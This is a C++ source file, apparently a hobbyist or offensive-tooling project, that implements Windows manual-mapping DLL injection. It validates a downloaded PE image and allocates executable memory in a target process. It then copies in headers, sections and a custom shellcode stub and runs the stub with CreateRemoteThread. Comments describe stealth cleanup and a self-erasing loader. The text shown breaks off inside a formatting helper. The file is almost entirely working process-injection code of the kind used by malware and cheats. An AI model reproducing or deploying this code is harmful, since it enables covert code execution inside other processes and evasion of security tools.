//cl /EHsc /GS- /Oy /Zi .\main.cpp .\injection.cpp /link /OUT:main.exe /DEBUG /MAP
/*
    /c               # compile only, no linking
    /GS-             # disable stack‑security cookies
    /Zl              # omit default CRT startup code
    /O2              # full optimization (speed + size)
    /Oy              # omit frame pointers (no stack‑frame prologue/epilogue)
    /Gy              # enable function‑level COMDATs (slightly smaller code)
    /MT              # (optional) link the static CRT if need to use a few CRT routines, try avoid CRT entirely 
*/
#include "injection.h"
#include <winternl.h>

#pragma comment(linker, "/SECTION:.stub,RE")

///////////////////////////////////////////////////////////////////////////////
BYTE* pSourceBase = nullptr;
BYTE* pTargetBase = nullptr;
IMAGE_DOS_HEADER* pDosHeader = nullptr;
IMAGE_NT_HEADERS* pNtHeader = nullptr;
IMAGE_OPTIONAL_HEADER* pOptionalHeader = nullptr;
IMAGE_FILE_HEADER* pFileHeader = nullptr;
IMAGE_SECTION_HEADER* pSectionHeader = nullptr;

size_t Dll_Actual_Size = 0;
DWORD peOffset = 0;

struct _RESOURCES
{
    BYTE* Injected_dll_base;
    BYTE* ResourceBase;
    BYTE* Injected_Shellcode_base;
    HANDLE TargetPid;

}sResources_for_shellcode;

///////////////////////////////////////////////////////////////////////////////
static void* FindExportAddress(HMODULE, const char*);

extern "C" __declspec(noinline) void __stdcall shellcode(LPVOID);
extern "C" int AddTwoNumbers(int a, int b);
extern "C" void Suicide(BYTE* pBase, void* my_NtFreeVirtualMemory, void* my_RtlExitUserThread, void* my_VirtualProtect);
///////////////////////////////////////////////////////////////////////////////

NTSTATUS SanityCheck()
{
    norm("\n.......................................SanityCheck.......................................");

    pDosHeader = (IMAGE_DOS_HEADER*) pSourceBase;
    if(pDosHeader->e_magic != 0x5A4D)
    {
        fuk("Invalid DOSHeader signature");
        return false;
    } else norm("\nDOSHeader signature\t\t\t-> ", std::hex, GREEN"0x", pDosHeader->e_magic);

    //...............................................................................

    if(Dll_Actual_Size < sizeof(IMAGE_DOS_HEADER))
    {
        fuk("Buffer too small for DOSHeader header");
        return false;
    } else norm("\nBuffer Size\t\t\t\t-> ", std::hex, GREEN"0x", Dll_Actual_Size);
    
    //...............................................................................

    peOffset = pDosHeader->e_lfanew;
    if(peOffset + sizeof(IMAGE_NT_HEADERS) > Dll_Actual_Size)
    {
        fuk("e_lfanew points past buffer end");
        return false;   
    } else norm("\nvalid e_lfanew\t\t\t\t-> ", GREEN"YES");

    //...............................................................................

    pNtHeader = (IMAGE_NT_HEADERS*)(pSourceBase + peOffset);
    pOptionalHeader = &pNtHeader->OptionalHeader;
    pFileHeader = (IMAGE_FILE_HEADER*)(&pNtHeader->FileHeader);
    
    if(pNtHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        fuk("Invalid NtHeader Signature");
    } else norm("\nNtHeader sign\t\t\t\t-> ", GREEN"YES");


    if(pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC && pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC)
    {
        fuk("Not a 64-bit or 32-bit PE");
        return false;
    } else norm("\nArchitecture \t\t\t\t-> ", GREEN"", (pNtHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) ? "64-bit" : "32-bit");

    //...............................................................................

    if(pNtHeader->OptionalHeader.SizeOfHeaders > Dll_Actual_Size)
    {
        fuk("Headers claim bigger than file");
        return false;
    } else norm("\nHeader size\t\t\t\t-> ", GREEN"OK");

    //...............................................................................

    WORD numSecs = pNtHeader->FileHeader.NumberOfSections;
    BYTE* secTable = (BYTE*)pNtHeader + sizeof(IMAGE_NT_HEADERS64);
    if((secTable - pSourceBase) + numSecs * sizeof(IMAGE_SECTION_HEADER) > Dll_Actual_Size)
    {
        fuk("Section table overruns file");
        return false;
    } else norm("\nSection table overrun\t\t\t-> ", GREEN"NO");
    
    //...............................................................................

    IMAGE_SECTION_HEADER* secs = (IMAGE_SECTION_HEADER*)secTable;
    for(int i = 0; i < numSecs; ++i)
    {
        IMAGE_SECTION_HEADER &s = secs[i];
        if(s.PointerToRawData + s.SizeOfRawData > Dll_Actual_Size)
        {
            fuk("Section raw data out of bounds");
            return false;
        }

        if(s.VirtualAddress + max(s.Misc.VirtualSize, s.SizeOfRawData) > pNtHeader->OptionalHeader.SizeOfImage)
        {
            fuk("Section VSize out of image bounds");
            return false;
        }
    }
    norm("\nSections VSize out of image bounds\t-> ", GREEN"NO");
    norm("\nSections data OutOfBounds\t\t-> ", GREEN"NO");

    //...............................................................................

    DWORD fileAlign = pNtHeader->OptionalHeader.FileAlignment;
    DWORD sectionAlign = pNtHeader->OptionalHeader.SectionAlignment;
    if(fileAlign == 0 || sectionAlign == 0 || (fileAlign & (fileAlign - 1)) || (sectionAlign & (sectionAlign - 1)) || sectionAlign < fileAlign)
    {
        fuk("Weird alignment values");
        return false;
    } else norm("\nAlignment\t\t\t\t-> ", GREEN"OK");
    

    norm("\n.......................................SanityCheck.......................................\n");
    return true;
}

NTSTATUS ManualMap(HANDLE hproc, std::vector <unsigned char> *downloaded_dll)
{
    norm("\n===========================================ManualMap===========================================");

    pSourceBase = downloaded_dll->data();
    Dll_Actual_Size = downloaded_dll->size();
    
    SanityCheck();

    //==========================================================================================

    #pragma region Allocate_mem

    /* 
        Allocated pOptionalHeader->SizeOfImage of memory at preffered base
        target base ->      pTargetBase
        space allocated ->  pOptionalHeader->SizeOfImage

        Verify
            State should be 0x1000
            type should be 0x20000
            Protect should be 0x40
    */

    pTargetBase = reinterpret_cast<BYTE*>(VirtualAllocEx(hproc, reinterpret_cast<void *>(pOptionalHeader->ImageBase), pOptionalHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    if(!pTargetBase)
    {
        warn("Allocation on preffered base failed, allocating randomly\n");
        
        pTargetBase = reinterpret_cast<BYTE*>(VirtualAllocEx(hproc, nullptr, pOptionalHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
        if(!pTargetBase)
        {
            fuk("Coudnt allocate memory ", GetLastError());
            delete[] pSourceBase;
            return 0;
        }
    } norm(std::hex, "\nAllocated ", CYAN"0x", pOptionalHeader->SizeOfImage, " bytes (", pOptionalHeader->SizeOfImage / 1024, " KB)", RESET" remote Memory at -> ", CYAN"0x", (uintptr_t)pTargetBase);


    //verify
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID baseAddress = 0;

    if(VirtualQueryEx(hproc, pTargetBase, &mbi, sizeof(mbi)) == sizeof(mbi))
    {
        if(mbi.State == 0x1000 && mbi.Type == 0x20000 && mbi.Protect == 0x40) norm(std::hex,"\n[", GREEN"OK", RESET"] ", "State ", CYAN"", mbi.State, RESET" Type ", CYAN"0x", mbi.Type, RESET" Protect ", CYAN"0x", mbi.Protect, "\n");
        else norm(std::hex, "\n[", RED"ISSUE", RESET"] ", "State ", CYAN"", mbi.State, RESET" Type ", CYAN"0x", mbi.Type, RESET" Protect ", CYAN"0x", mbi.Protect);
    } else fuk("VirtualQueryEx failed");

    #pragma endregion
    
    //==========================================================================================

    #pragma region Cpy_Headers

    /* 
        Cpy the whole header to the target base at pTargetBase
        size of header is in pOptionalHeader->SizeOfHeaders;

        Verify
            query the region
            no header and section overlap

    */

    norm("\n- - - - - - - - - - - - - Copy Headers - - - - - - - - - - - - -");
    norm("\nCopying Headers in the target..");

    if(!WriteProcessMemory(hproc, pTargetBase, pSourceBase, pOptionalHeader->SizeOfHeaders, nullptr))
    {
        fuk("Failed to copy headers");
        delete[] pSourceBase;
        return 0;
    }

    //= = = = = = = = = = = = = = = = = = = = = = = = =CHECK= = = = = = = = = = = = = = = = = = = = = = = = =
    // MEMORY_BASIC_INFORMATION mbi;
    if(VirtualQueryEx(hproc, pTargetBase, &mbi, sizeof(mbi)) != sizeof(mbi))
    {
        fuk("Can't query remote region");
        return false;
    }

    IMAGE_SECTION_HEADER* pSection = IMAGE_FIRST_SECTION(pNtHeader);
    if(pOptionalHeader->SizeOfHeaders > pSection->PointerToRawData)
    {
        fuk("Headers overlap first section!");
        return false;
    }
    //= = = = = = = = = = = = = = = = = = = = = = = = =CHECK= = = = = = = = = = = = = = = = = = = = = = = = =

    norm("\nHeaders Copied to ", std::hex, CYAN"0x", (uintptr_t)pTargetBase, RESET" and ends at ", CYAN"0x", (uintptr_t)(pTargetBase + pOptionalHeader->SizeOfHeaders), RESET" size[", CYAN"0x", (uintptr_t)pOptionalHeader->SizeOfHeaders, RESET"]");

    norm("\n- - - - - - - - - - - - - Copy Headers - - - - - - - - - - - - -\n");
    #pragma endregion

    //==========================================================================================

    #pragma region Cpy_Sections

    /* 
        copy the sections to the target at pTargetBase + pSectionHeader->VirtualAddress
        form an offset of PointerToRawData in pSourceBase

        verify each by printing the section names and then the start and end addresses of all..
    */
    
    norm("\n= = = = = = = = = = = = = Copy Sections = = = = = = = = = = = = =");
    norm("\nCopying Sections in the target..");
    
    // IMAGE_SECTION_HEADER* pSection = IMAGE_FIRST_SECTION(pNtHeader);
    for(UINT i = 0; i != pFileHeader->NumberOfSections; ++i, ++pSection)
    {
        if(pSection->SizeOfRawData)
        {
            auto pSource = pSourceBase + pSection->PointerToRawData;
            auto pTarget = pTargetBase + pSection->VirtualAddress;
            
            if(!WriteProcessMemory(hproc, pTarget, pSource, pSection->SizeOfRawData, nullptr))
            {
                fuk("Coudnt copy the sections in target memory");
                delete[] pSourceBase;
                return 0;
            }
            

            //= = = = = = = = = = = = = = = = = = = = = = = = =CHECK= = = = = = = = = = = = = = = = = = = = = = = = =

            if(pSection->SizeOfRawData > 0x7FFFFFFF)
            {
                fuk("Section size too large - possible overflow");
                delete[] pSourceBase;
                return 0;
            }
            
            uintptr_t sectionEnd = (uintptr_t)pTarget + pSection->SizeOfRawData;      // Overflow check
            if(sectionEnd < (uintptr_t)pTarget)
            {  
                fuk("Section address overflow detected");
                delete[] pSourceBase;
                return 0;
            }

            MEMORY_BASIC_INFORMATION mbi;
            if(VirtualQuery((LPCVOID)pTarget, &mbi, sizeof(mbi)) == 0)                     // Verify section is within allocated memory bounds
            {
                fuk("Cannot query memory region");
                delete[] pSourceBase;
                return 0;
            }

            if(sectionEnd > ((uintptr_t)mbi.BaseAddress + mbi.RegionSize))
            {
                fuk("Section extends beyond allocated memory");
                delete[] pSourceBase;
                return 0;
            }

            //= = = = = = = = = = = = = = = = = = = = = = = = =CHECK= = = = = = = = = = = = = = = = = = = = = = = = =

            norm("\nSection ", GREEN"", pSection->Name, RESET"\tfrom ", std::hex, CYAN"0x", (uintptr_t)pTarget, RESET"", " to ", CYAN"0x", sectionEnd, RESET" size[", CYAN"0x", (uintptr_t)pSection->SizeOfRawData, RESET"]");
        }
    }
    norm("\n= = = = = = = = = = = = = Copy Sections = = = = = = = = = = = = =");

    #pragma endregion

    //==========================================================================================

    #pragma region Inject_Shellcode
    /*
        calculate the size of the shellcode and store it in shellcodeBlockSize
        inject the shellcode at pShellcodeTargetBase
        
        Execute it via a remote thread...
    */

    norm("\n\n=_=_=_=_=_=_=_=_=_=_=_=_=_Cpy Shellcode_=_=_=_=_=_=_=_=_=_=_=_=_=");
    norm("\nCopying Shellcode in the target..");

    
    BYTE* exeBase = (BYTE*)GetModuleHandle(NULL);
    auto dos  = (IMAGE_DOS_HEADER*)exeBase;
    auto nt   = (IMAGE_NT_HEADERS*)(exeBase + dos->e_lfanew);
    auto sec  = IMAGE_FIRST_SECTION(nt);

    void* vpStartAddressOfShellcode = nullptr;
    size_t shellcodeBlockSize = 0;
    IMAGE_SECTION_HEADER* stubSection = nullptr;

    for(UINT i = 0; i != pFileHeader->NumberOfSections; ++i, ++sec)
    {
        if(sec->SizeOfRawData)
        {
            if(memcmp(sec->Name, ".stub", 5) == 0)
            {
                vpStartAddressOfShellcode = exeBase + sec->VirtualAddress;
                shellcodeBlockSize = sec->Misc.VirtualSize;
                stubSection = sec;
                break;
            }
        }
    }
    if(!stubSection)
    {
        fuk("Could not find .stub section");
        return 0;
    } norm("\nStart location of ", CYAN"", stubSection->Name, RESET" is", CYAN" 0x", (uintptr_t)vpStartAddressOfShellcode, RESET" size[", CYAN"0x", shellcodeBlockSize, RESET"]");

    BYTE* pShellcodeResourceBase = reinterpret_cast<BYTE*>(VirtualAllocEx(hproc, nullptr, shellcodeBlockSize + sizeof(_RESOURCES), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    if(!pShellcodeResourceBase)
    {
        fuk("Coudnt allocate memory ", GetLastError());
        delete[] pSourceBase;
        return 0;
    } norm(std::hex, "\n\nAllocated ", CYAN"0x", shellcodeBlockSize, " bytes (", shellcodeBlockSize / 1024.0, " KB)", RESET" remote Memory at -> ", CYAN"0x", (uintptr_t)pShellcodeResourceBase);

    //verify
    if(VirtualQueryEx(hproc, pShellcodeResourceBase, &mbi, sizeof(mbi)) == sizeof(mbi))
    {
        if(mbi.State == 0x1000 && mbi.Type == 0x20000 && mbi.Protect == 0x40) norm(std::hex,"\n[", GREEN"OK", RESET"] ", "State ", CYAN"", mbi.State, RESET" Type ", CYAN"0x", mbi.Type, RESET" Protect ", CYAN"0x", mbi.Protect, "\n");
        else norm(std::hex, "\n[", RED"ISSUE", RESET"] ", "State ", CYAN"", mbi.State, RESET" Type ", CYAN"0x", mbi.Type, RESET" Protect ", CYAN"0x", mbi.Protect);
    } else fuk("VirtualQueryEx failed");

    //-------------------------------
        BYTE* pShellcodeTargetBase = pShellcodeResourceBase + sizeof(sResources_for_shellcode);
        sResources_for_shellcode.Injected_dll_base = pTargetBase;
        sResources_for_shellcode.Injected_Shellcode_base = pShellcodeTargetBase;
        sResources_for_shellcode.ResourceBase = pShellcodeResourceBase;
        sResources_for_shellcode.TargetPid = hproc;
    //--------------------------------------------------fill resources data before this------------------

    if(!WriteProcessMemory(hproc, pShellcodeResourceBase, &sResources_for_shellcode, sizeof(sResources_for_shellcode), nullptr))
    {
        fuk("Failed to copy the shellcode ", GetLastError());
        delete[] pSourceBase;
        return 0;
    } norm("\nShellcode resources Copied to ", std::hex, CYAN"0x", (uintptr_t)pShellcodeResourceBase, RESET" and ends at ", CYAN"0x", (uintptr_t)(pShellcodeResourceBase + sizeof(sResources_for_shellcode)), RESET" size[", CYAN"0x", sizeof(sResources_for_shellcode), RESET"]");


    //-----------------

    if(!WriteProcessMemory(hproc, pShellcodeTargetBase, vpStartAddressOfShellcode, shellcodeBlockSize, nullptr))
    {
        fuk("Failed to copy the shellcode ", GetLastError());
        delete[] pSourceBase;
        return 0;
    } norm("\nShellcode Copied to ", std::hex, CYAN"0x", (uintptr_t)pShellcodeTargetBase, RESET" and ends at ", CYAN"0x", (uintptr_t)(pShellcodeTargetBase + shellcodeBlockSize), RESET" size[", CYAN"0x", shellcodeBlockSize, RESET"]");

    
    //-----------------

    uintptr_t shellcodeFunctionAddressInMyProcess = (uintptr_t)&shellcode;
    uintptr_t shellcodeRVA = shellcodeFunctionAddressInMyProcess - (uintptr_t)exeBase;

    DWORD offsetOfShellcodeInStub = shellcodeRVA - stubSection->VirtualAddress;
    LPVOID pActualShellcodeEntryInTarget = (PBYTE)pShellcodeTargetBase + offsetOfShellcodeInStub;

    DWORD ShellcodeThreadId = 0;
    if(!CreateRemoteThread(hproc, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pActualShellcodeEntryInTarget), pShellcodeResourceBase, 0, &ShellcodeThreadId))
    {
        fuk("Failed to create a thread shellcode ", GetLastError());
        return 0;
    } norm("\nThread id -> ", std::dec, CYAN"", (int)ShellcodeThreadId);


    norm("\n=_=_=_=_=_=_=_=_=_=_=_=_=_Cpy Shellcode_=_=_=_=_=_=_=_=_=_=_=_=_=");
    #pragma endregion

    //==========================================================================================

    norm("\n===========================================ManualMap===========================================");
    /*
        Cleanup & Stealth Tidy-Up
        Unhook Imports: if any hooked APIs to drive the loader, unhook them in your shellcode region.
        Self-Erase Loader Stub: if inject a small bootstrap stub, have it VirtualFreeEx its own memory once the real DLL is running.
    */

    return 1;
}

static void* FindExportAddress(HMODULE hModule, const char* funcName)
{
    if(!hModule || !funcName) return nullptr;

    BYTE* base = (BYTE*)hModule;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    DWORD peOffset = dos->e_lfanew;
    DWORD peSig = *(DWORD*)(base + peOffset);
    
    // printf("\n[DEBUG] DOS e_lfanew: 0x%X", peOffset);
    // printf("\n[DEBUG] NT Signature: 0x%X", peSig);

    base = (BYTE*)hModule;
    dos = (IMAGE_DOS_HEADER*)base;
    if(dos->e_magic != IMAGE_DOS_SIGNATURE){ fuk("Magic did not match"); return nullptr; }

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if(nt->Signature != IMAGE_NT_SIGNATURE){ fuk("NT signature did not match"); return nullptr; }

    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if(dir.VirtualAddress == 0){ fuk("Optional header issue"); return nullptr; }

    // printf("\nExportDir VA: 0x%X, Size: 0x%X", dir.VirtualAddress, dir.Size);
    warn("Trying to resolve ",YELLOW"", funcName);

    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + dir.VirtualAddress);
    DWORD* nameRVAs = (DWORD*)(base + exp->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(base + exp->AddressOfFunctions);

    for(DWORD i = 0; i < exp->NumberOfNames; ++i)
    {
        char* name = (char*)(base + nameRVAs[i]);
        if(_stricmp(name, funcName) == 0)
        {
            DWORD funcRVA = functions[ordinals[i]];
            BYTE* addr = base + funcRVA;

            // Forwarded export check
            if(funcRVA >= dir.VirtualAddress && funcRVA < dir.VirtualAddress + dir.Size)
            {
                fuk("Forwarded export: ", funcName);
                return nullptr;
            }
            return (void*)addr;
        }
    }

    fuk("Function not found: ", funcName);
    return nullptr;
}


#pragma region Shellcode
#pragma code_seg(push, ".stub")

    #define S_OK ((HRESULT)0L)                                                  // Common HRESULT for success
    #define STRSAFE_E_INSUFFICIENT_BUFFER ((HRESULT)0x8007007AL)                // From strsafe.h

    #define PASTE_INTERNAL(a, b) a##b
    #define PASTE(a, b) PASTE_INTERNAL(a, b)
    #define LOG_W(fmt_literal, ...) \
        do \
        { \
            __declspec(allocate(".stub")) static const WCHAR PASTE(_fmt_str_, __LINE__)[] = fmt_literal; \
            \
            if(my_OutputDebugStringW) \
            { \
                int written = ShellcodeSprintfW(g_shellcodeLogBuffer, sizeof(g_shellcodeLogBuffer)/sizeof(WCHAR), PASTE(_fmt_str_, __LINE__), ##__VA_ARGS__); \
                if(written >= 0) \
                { \
                    my_OutputDebugStringW(g_shellcodeLogBuffer); \
                } else my_OutputDebugStringW(L"LOG_W formatting error or buffer too small."); \
            } \
        } while (0)


    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////

    typedef int(WINAPI* pfnMessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
    typedef void(WINAPI* pfnOutputDebugStringW)(LPCWSTR lpOutputString);
    typedef HRESULT(WINAPI* pfnStringCchPrintfW)(LPWSTR pszDest, size_t cchDest, LPCWSTR pszFormat, ...);
    typedef HMODULE(WINAPI* pfnLoadLibraryA)(LPCSTR lpLibFileName);
    typedef HANDLE(WINAPI* pfnCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
    typedef BOOL(WINAPI* pfnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
    typedef BOOL(WINAPI* pfnDLLMain)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
    typedef BOOL(WINAPI* pfnCloseHandle)(HANDLE hObject);
    
    typedef void(NTAPI* PIMAGE_TLS_CALLBACK)(PVOID DllHandle, DWORD Reason, PVOID Reserved);
    typedef void(NTAPI* pfnRtlFillMemory)(void* Destination, size_t Length, int Fill);
    typedef NTSTATUS(NTAPI* pfnNtFreeVirtualMemory)(HANDLE hProcessHandel, void* vpBaseAddress, PSIZE_T RegionSize, ULONG FreeType);
    typedef NTSTATUS(NTAPI* pfnNtProtectVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, PULONG NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection);
    typedef void(NTAPI* pfnRtlExitUserThread)(NTSTATUS ExitStatus);
    typedef NTSTATUS(NTAPI* pfnNtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval);
    typedef PVOID(NTAPI* pfnRtlAllocateHeap)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
    typedef BOOL(NTAPI* pfnRtlFreeHeap)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
    
    typedef HANDLE(WINAPI* pfnCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
    typedef BOOL(WINAPI* pfnDeviceIoControl)(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped);
    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////

    typedef struct _DLLMAIN_THREAD_PARAMS
    {
        pfnDLLMain pfnDllMain;
        HINSTANCE hinstDLL;
        VOID* vpAllocatedHeap;
        pfnRtlFreeHeap pRtlFreeHeap;
        VOID* vpTarget_process_Heap;
        // DWORD fdwReason;
        // LPVOID lpvReserved;
        // HANDLE hCompletionEvent; // For advanced synchronization
    } DLLMAIN_THREAD_PARAMS, *PDLLMAIN_THREAD_PARAMS;    

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////

    __declspec(allocate(".stub")) static const WCHAR kNtdll[] = L"ntdll.dll";
    __declspec(allocate(".stub")) static const WCHAR kUsr32[] = L"user32.dll";
    __declspec(allocate(".stub")) static const WCHAR hKernelbase[] = L"kernelbase.dll";

    __declspec(allocate(".stub")) static const CHAR cMessageBoxWFunction[] = "MessageBoxW";
    __declspec(allocate(".stub")) static const CHAR cOutputDebugStringWFunction[] = "OutputDebugStringW";
    __declspec(allocate(".stub")) static const CHAR cLoadLibraryAFunction[] = "LoadLibraryA"; 
    __declspec(allocate(".stub")) static const CHAR cVirtualProtectFunction[] = "VirtualProtect";
    __declspec(allocate(".stub")) static const CHAR cCreateThreadFunction[] = "CreateThread";
    __declspec(allocate(".stub")) static const CHAR cCloseHandleFunction[] = "CloseHandle";
    __declspec(allocate(".stub")) static const CHAR cRtlFillMemoryFunction[] = "RtlFillMemory";
    __declspec(allocate(".stub")) static const CHAR cNtFreeVirtualMemoryFunction[] = "NtFreeVirtualMemory";
    __declspec(allocate(".stub")) static const CHAR cRtlExitUserThreadFunction[] = "RtlExitUserThread";
    __declspec(allocate(".stub")) static const CHAR cNtProtectVirtualMemoryFunction[] = "NtProtectVirtualMemory"; 
    __declspec(allocate(".stub")) static const CHAR cNtDelayExecutionFunction[] = "NtDelayExecution";
    __declspec(allocate(".stub")) static const CHAR cRtlAllocateHeapFunction[] = "RtlAllocateHeap";
    __declspec(allocate(".stub")) static const CHAR cRtlFreeHeapFunction[] = "RtlFreeHeap";

    __declspec(allocate(".stub")) static const CHAR cCreateFileWFunction[] = "CreateFileW";
    __declspec(allocate(".stub")) static const CHAR cDeviceIoControlFunction[] = "DeviceIoControl";

    __declspec(allocate(".stub")) pfnMessageBoxW my_MessageBoxW = nullptr;
    __declspec(allocate(".stub")) pfnOutputDebugStringW my_OutputDebugStringW = nullptr;
    __declspec(allocate(".stub")) pfnLoadLibraryA my_LoadLibraryA = nullptr;
    __declspec(allocate(".stub")) pfnVirtualProtect my_VirtualProtect = nullptr;
    __declspec(allocate(".stub")) pfnCreateThread my_CreateThread = nullptr;
    __declspec(allocate(".stub")) pfnCloseHandle my_CloseHandle = nullptr;
    __declspec(allocate(".stub")) pfnRtlFillMemory my_RtlFillMemory = nullptr;
    __declspec(allocate(".stub")) pfnNtFreeVirtualMemory my_NtFreeVirtualMemory = nullptr;
    __declspec(allocate(".stub")) pfnRtlExitUserThread my_RtlExitUserThread = nullptr;
    __declspec(allocate(".stub")) pfnNtProtectVirtualMemory my_NtProtectVirtualMemory = nullptr;
    __declspec(allocate(".stub")) pfnNtDelayExecution my_NtDelayExecution = nullptr;
    __declspec(allocate(".stub")) pfnRtlAllocateHeap my_RtlAllocateHeap = nullptr;
    __declspec(allocate(".stub")) pfnRtlFreeHeap my_RtlFreeHeap = nullptr;
    
    __declspec(allocate(".stub")) pfnCreateFileW my_CreateFileW = nullptr;
    __declspec(allocate(".stub")) pfnDeviceIoControl my_DeviceIoControl = nullptr;

    __declspec(allocate(".stub")) static const WCHAR g_hexChars[] = L"0123456789ABCDEF";
    __declspec(allocate(".stub")) static WCHAR g_shellcodeLogBuffer[256];

    // __declspec(allocate(".stub")) static DLLMAIN_THREAD_PARAMS dllMainParams;
    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////

    __declspec(noinline) void __stdcall HelperSplitFilename(const WCHAR* full, SIZE_T fullLen, const WCHAR** outName, SIZE_T* outLen)
    {
        SIZE_T i = fullLen;
        while(i > 0)
        {
            WCHAR c = full[i - 1];
            if(c == L'\\' || c == L'/') break;
            --i;
        }
        *outName = full + i;
        *outLen  = fullLen - i;
    }

    __declspec(noinline) bool __stdcall isSame(const char* a, const char* b)
    {
        while(*a && *b)
        {
            char ca = *a, cb = *b;
            if(ca >= 'A' && ca <= 'Z') ca += ('a' - 'A');
            if(cb >= 'A' && cb <= 'Z') cb += ('a' - 'A');
            if(ca != cb) return false;
            ++a; ++b;
        }
        return (*a == '\0' && *b == '\0');
    }

    __declspec(noinline) bool __stdcall isSameW(const WCHAR* a, const WCHAR* b, SIZE_T len)
    {
        for(SIZE_T i = 0; i < len; i++)
        {
            WCHAR ca = a[i], cb = b[i];
            // tolower for ASCII A–Z
            if(ca >= L'A' && ca <= L'Z') ca += 32;
            if(cb >= L'A' && cb <= L'Z') cb += 32;
            if(ca != cb) return false;
        }
        return true;
    }


    __declspec(noinline) static WCHAR* __stdcall UllToHexW(unsigned __int64 val, WCHAR* buf_end, int max_chars)
    {
        // Helper to convert unsigned long long to hex string
        // Writes to buffer from right to left, returns pointer to start of written string in buffer
        if(max_chars <= 0) return buf_end;
        
        WCHAR* p = buf_end;
        *p = L'\0';
        if(val == 0 && max_chars > 0)
        {
            --p;
            *p = L'0';
            
            return p;
        }
        int count = 0;
        while(val > 0 && count < max_chars)
        {
            --p;
            *p = g_hexChars[val & 0xF];
            val >>= 4;
            count++;
        }
        return p;
    }

    __declspec(noinline) static WCHAR* __stdcall IntToDecW(int val, WCHAR* buf_end, int max_chars)
    {
        // Helper to convert integer to decimal string
        // Writes to buffer from right to left, returns pointer to start of written string in buffer
        if(max_chars <= 0) return buf_end;

        WCHAR* p = buf_end;
        *p = L'\0';
        if(val == 0 && max_chars > 0)
        {
            --p;
            *p = L'0';
            
            return p;
        }
        
        bool negative = false;
        if(val < 0)
        {
            negative = true;
            val = -val;                             // Make positive, careful with INT_MIN
            if(val < 0)
            {   
                // Overflow for INT_MIN
                // Handle INT_MIN specifically if needed, or just let it be large positive
            }
        }

        int count = 0;
        while(val > 0 && count < max_chars)
        {
            --p;
            *p = L'0' + (val % 10);
            val /= 10;
            count++;
        }
        if(negative && count < max_chars)
        {
            --p;
            *p = L'-';
        }
        return p;
    }

    __declspec(noinline) static int __cdecl ShellcodeSprintfW(LPWSTR pszDest, size_t cchDest, LPCWSTR pszFormat, ...)
    {
        // * Supported format specifiers:
        // * - %s  : Wide string (LPCWSTR)
        // * - %hs : ANSI string (LPCSTR)
        // * - %p  : Pointer value in hex
        // * - %X  : Unsigned int in hex
        // * - %hX : Unsigned short in hex 
        // * - %hx : Unsigned short in hex (lowercase)
        // * - %d  : Signed int in decimal
        // * - %%  : Literal percent sign
        // Returns number of characters written (excluding null terminator), or -1 on error/truncation
        
        if(!pszDest || !pszFormat || cchDest == 0) return -1;

        LPWSTR pDest = pszDest;
        LPCWSTR pFmt = pszFormat;
        size_t remaining = cchDest -1;      // Space for null terminator

        va_list args;
        va_start(args, pszFormat);

        WCHAR tempNumBuf[24];               // Buffer for number to string conversions (e.g., 64-bit hex + null)

        while(*pFmt && remaining > 0)
        {
            if(*pFmt == L'%')
            {
                pFmt++;

                switch(*pFmt)
                {
                    case L's': // Wide string
                    {
                        LPCWSTR str_arg = va_arg(args, LPCWSTR);
                        if(!str_arg) str_arg = L"(null)";
                        while(*str_arg && remaining > 0)
                        {
                            *pDest++ = *str_arg++;
                            remaining--;
                        }
                        break;
                    }

                    case L'h': // Potentially char* string OR short hex/dec
                        if(*(pFmt + 1) == L's')
                        { // %hs
                            pFmt++; // consume 's'
                            LPCSTR str_arg_a = va_arg(args, LPCSTR);
                            if(!str_arg_a) str_arg_a = "(null)"; // or some other indicator
                            while(*str_arg_a && remaining > 0)
                            {
                                *pDest++ = (WCHAR)(*str_arg_a++);
                                remaining--;
                            }
                        } 
                        else if(*(pFmt + 1) == L'X' || *(pFmt + 1) == L'x') 
                        { // %hX or %hx
                            pFmt++; // consume 'X' or 'x'
                            // Arguments smaller than int are promoted to int when passed via va_arg
